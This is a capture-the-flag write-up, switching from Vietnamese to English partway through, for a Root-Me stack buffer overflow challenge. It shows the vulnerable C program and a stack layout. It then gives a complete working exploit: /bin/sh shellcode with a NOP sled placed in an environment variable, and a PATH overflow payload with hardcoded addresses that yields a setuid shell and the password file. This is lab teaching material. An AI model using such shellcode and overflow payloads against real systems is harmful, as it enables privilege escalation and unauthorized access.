
# Co-che-hoat-dong-cua-ma-doc - challenge 5 CTF Write up
```html
ELF x86 - Stack buffer overflow basic 4: ssh -p 2222 app-systeme-ch8@challenge02.root-me.org 
```

![image](https://user-images.githubusercontent.com/64201705/120130184-bac8d300-c1ef-11eb-9a06-2c075e009029.png)

## Write up

```Text
Sau khi SSH vào server thì ta dùng lệnh cat để in code trong file source code ra
app-systeme-ch8@challenge02:~$ cat ch8.c
```
Ta sẽ được như này:
```C
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>

struct EnvInfo
{
  char home[128];
  char username[128];
  char shell[128];
  char path[128];
};


struct EnvInfo GetEnv(void)
{
  struct EnvInfo env;
  char *ptr;

  if((ptr = getenv("HOME")) == NULL)
    {
      printf("[-] Can't find HOME.\n");
      exit(0);
    }
  strcpy(env.home, ptr);
  if((ptr = getenv("USERNAME")) == NULL)
    {
      printf("[-] Can't find USERNAME.\n");
      exit(0);
    }
  strcpy(env.username, ptr);
  if((ptr = getenv("SHELL")) == NULL)
    {
      printf("[-] Can't find SHELL.\n");
      exit(0);
    }
  strcpy(env.shell, ptr);
  if((ptr = getenv("PATH")) == NULL)
    {
      printf("[-] Can't find PATH.\n");
      exit(0);
    }
  strcpy(env.path, ptr);
  return env;
}

int main(void)
{
  struct EnvInfo env;

  printf("[+] Getting env...\n");
  env = GetEnv();

  printf("HOME     = %s\n", env.home);
  printf("USERNAME = %s\n", env.username);
  printf("SHELL    = %s\n", env.shell);
  printf("PATH     = %s\n", env.path);

  return 0;
}
```
Đối với challenge này, ta thấy chương trình sẽ load biến môi trường lên và sử dụng hàm `strcpy` để thực hiện copy env đó qua con trỏ ptr. Vì thế, ta sẽ nghĩ tới việc chương trình sẽ load đoạn shell code do ta chuẩn bị nằm trong biến môi trường và copy qua con trỏ. Sau đó sẽ ghi đè câu lệnh return 0 để gọi tới hàm có địa chỉ nằm trong shell code.
Đầu tiên ta thấy chương trình cần biến môi trường `USERNAME` cho nên ta sẽ export biến này trước: `export USERNAME=AAAA`
Sau khi gọi hàm Getenv() và gần tới câu lệnh return, stack sẽ có dạng:
```
            +----------------------------+
            |      HOME env variable     |     %ebp - 540
            +----------------------------+
            |    USERNAME env variable   |     %ebp - 412
            +----------------------------+
            |      SHELL env variable    |     %ebp - 284
            +----------------------------+
            |      PATH env variable     |     %ebp - 156
            +----------------------------+
            |           saved ebp        |
            +----------------------------+
            |        return address      |     %ebp + 4
            +----------------------------+
            |   rep movsl dest. address  |     %ebp + 8
            +----------------------------+  
```
This problem is very similar to the last one. We need to simply put our shellcode in one of the environment variables, and then overflow the last environment variable with the address of it to overwrite our return address, although there is one tricky issue which we will get to later. Firstly, let's write our shellcode. In this particular case, it's difficult to predict exactly where our environment variable will be placed, so we should write a bunch of nop operations in front of our code which make it easier to jump to our code, as if we jump anywhere within the nop section it'll continue forward until the actual code. The shellcode I used was from here as the previous 23-byte shellcode didn't work for some reason. We can do it easily from bash like so, which will fit perfectly into our 128-byte buffer: export USERNAME=`python -c 'print("\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")'` . Now that we have our shellcode in our environment, let's find out where it's located so that we can overwrite the return pointer to it. Open the program in GDB, set a breakpoint at line 44(just before the return), and get the location of username like so: x/x env.username. In my case it was 0xbffff4fc but I set my pointer to 0xbffff53c to give it a bit of headroom on either side so if the values are off slilghtly it should still work. However, there are two more things we need to find out first. In this case we will use PATH for our buffer overflow as it's at the bottom of the struct. We firstly need to find out the offset between path and our return pointer. With the program open in GDB and stopped at line 44 again, get the address of PATH: x/x env.path, and the address of our return pointer: x/x $esp+4. If you subtract them, you should find that they are 160 bytes apart from each other. Finally, the tricky thing I mentioned earlier. As the function returns a struct, and the struct is initially allocated on the stack, when it returns it copies the struct into a global variable. The pointer telling it where to copy the struct to is located directly after the return pointer. Hence, if we strcpy up to the return pointer, we will overwrite the pointer will the null byte that strcpy adds to the end. The solution is to check what it's original value is, and to rewrite it with that value so that the null byte doesn't get written over it. You can do that by running x/42xw env/path. This will allow us to confirm that the return address is indeed stored at env.path+164(it should be the second last address), and we can also get the value of the new struct location(the last address). In my case, it was 0xbffff750. Finally, we need to write the overflow exploit to the path environment variable. Firstly, get the length of the variable with echo ${#PATH}. Pad it to the nearest 4(I used colons for the padding but it doesn't matter much), and then write the address with the bytes reversed(we are using little-endian) enough times to get our total length to 164. Then add the new struct address onto the end(remember to reverse the bytes again), so that the total length is now 168. This can all be done in one command like so: export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/opt/tools/checksec/:::`python -c 'print("\x3c\xf5\xff\xbf"*13+"\x50\xf7\xff\xbf")'` . At this point, you should be able to run the program and get a shell as the setuid user. You can then get the password by running cat .passwd.



